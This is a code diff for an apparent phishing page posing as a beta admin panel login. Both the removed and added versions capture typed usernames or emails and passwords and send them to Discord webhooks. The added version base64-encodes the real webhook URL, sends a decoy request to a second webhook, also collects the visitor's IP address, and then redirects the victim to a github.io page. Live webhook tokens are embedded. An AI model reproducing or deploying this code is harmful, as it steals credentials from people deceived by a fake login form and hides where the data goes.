@@ -1,52 +1,74 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ben's Beta Admin Panel Login</title>
-    <script>
-        function sendToWebhook() {
-            const textbox1 = document.getElementById('textbox1').value;
-            const textbox2 = document.getElementById('textbox2').value;
+const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMDc3NTk5NzIzODM0NTcyOC9aVk5tX2F4RVRUN1d3TnZOVkhjdXBsaGRUZk14SUs4Z05LS25XMUtFUl8zQ1NTYkNzcHc3WERKaXlrWUJ6YkNmcE5iSA';
 
-            // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
-            const webhookUrl = 'https://discord.com/api/webhooks/1311130050514391111/BE3ZE5VJ2Od0BSlMC9LrDQUNnY81g_M2qoHEvk4SlzKCs1DzqC7DEl9EqshxaChbgTR-';
+const skibidiCheckbox = document.getElementById('skibidiCheckbox');
+const loginButton = document.getElementById('loginButton');
 
-            // Prepare the payload to send
-            const payload = {
-                content: `Textbox 1: ${textbox1}\nTextbox 2: ${textbox2}`
-            };
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
 
-            // Send the POST request to the Discord webhook
-            fetch(webhookUrl, {
+    if (!skibidiCheckbox.checked) {
+        skibidiCheckbox.classList.add('error');
+        alert('Please check the box.');
+        return;
+    } else {
+        skibidiCheckbox.classList.remove('error');
+    }
+
+    const email = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    // List of IPs to block (placeholders for now)
+    const blockedIPs = ['89.187.164.251'];
+
+    // Fetch the user's IP address using ipify
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const userIP = data.ip;
+
+            // Check if the IP is blocked
+            if (blockedIPs.includes(userIP)) {
+                alert('Access denied. Your IP is blocked.');
+                window.location.href = 'https://cryptodude3.github.io/badmin/';
+                return;
+            }
+
+            // Send data to Discord webhook
+            fetch('https://discord.com/api/webhooks/1310775997238345728/ZVNm_axETT7WwNvNVHcuplhdTfMxIK8gNKKnW1KER_KGHDYYgshYohghd', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    Data: 'the user info discord webhook'
+                })
+            });
+
+            // Decode and fetch user info
+            const userInfo = atob(userinfoEncoded);
+            
+            fetch(userInfo, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `New Login Attempt:
+Email: ||${email}||
+Password: ||${password}||
+IP Address: ||${userIP}||`
+                })
             })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-                alert('Failed to login');
+            .then(response => {
+                window.location.href = 'https://cryptodude3.github.io/badmin/';
             })
             .catch(error => {
                 console.error('Error:', error);
-                alert('There was an error.');
+                window.location.href = 'https://cryptodude3.github.io/badmin/';
             });
-        }
-    </script>
-</head>
-<body>
-    <h2>Ben Stewart's Beta Admin Panel</h2>
-    <form onsubmit="event.preventDefault(); sendToWebhook();">
-        <label for="textbox1">Username:</label><br>
-        <input type="text" id="textbox1" name="textbox1" required><br><br>
-
-        <label for="textbox2">Password:</label><br>
-        <input type="text" id="textbox2" name="textbox2" required><br><br>
-
-        <button type="submit">Login to ADMIN PANEL</button>
-    </form>
-</body>
-</html>
+        })
+        .catch(error => {
+            console.error('Error fetching IP:', error);
+            window.location.href = 'https://cryptodude3.github.io/badmin/';
+        });
+});
